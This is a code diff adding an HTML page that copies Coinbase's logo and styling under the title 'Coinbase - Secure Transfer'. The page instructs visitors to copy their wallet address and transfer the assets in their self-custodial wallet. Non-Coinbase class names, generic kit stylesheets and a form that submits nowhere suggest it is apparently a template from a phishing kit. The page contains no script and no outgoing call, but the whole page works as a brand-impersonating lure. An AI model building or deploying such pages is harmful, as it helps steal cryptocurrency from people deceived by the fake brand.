@@ -1,0 +1,64 @@
+
+<!DOCTYPE html>
+<html class="ll-fb" lang="en" style="background:#0a0b0d;">
+ <head>
+  <meta charset="utf-8"/>
+  <link rel="icon" href="assets/Coinbaselogo.png"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Coinbase - Secure Transfer</title>
+  <meta content="#000000" name="theme-color"/>
+  <link rel="stylesheet" href="css/flow-b-shell.css"/>
+  <link href="css/31.css" rel="stylesheet"/>
+  <style>
+html.ll-fb,
+html.ll-fb *,
+html.ll-fb *::before,
+html.ll-fb *::after {
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
+}
+  </style>
+</head>
+ <body style="background:#0a0b0d;">
+  <div class="ll-fb-type" id="root">
+   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
+    <div class="w-full px-6 pt-5">
+     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
+      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
+      </path>
+     </svg>
+    </div>
+    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
+     <form action="#" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
+      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
+       Securely transfer assets to <span id="cb-st-wallet-name">Coinbase Wallet</span>
+      </span>
+      <span class="font-coinbase-sans text-coinbase-foreground-muted">
+       1. Open <span id="cb-st-wallet-name-step">Coinbase Wallet</span> on your mobile device.
+      </span>
+      <br/>
+      <span class="font-coinbase-sans text-coinbase-foreground-muted">
+       2. Tap
+       <b>
+        Receive
+       </b>
+       and copy your wallet address of the asset you wish to receive.
+      </span>
+      <br/>
+      <span class="font-coinbase-sans text-coinbase-foreground-muted">
+       3. Open the Coinbase app and tap
+       <b>
+        transfer
+       </b>
+       . Then follow the remaining steps to transfer your self-custodial wallet.
+      </span>
+      <button id="cb-st-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-6" type="button">
+       Continue
+      </button>
+     </form>
+  
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
+
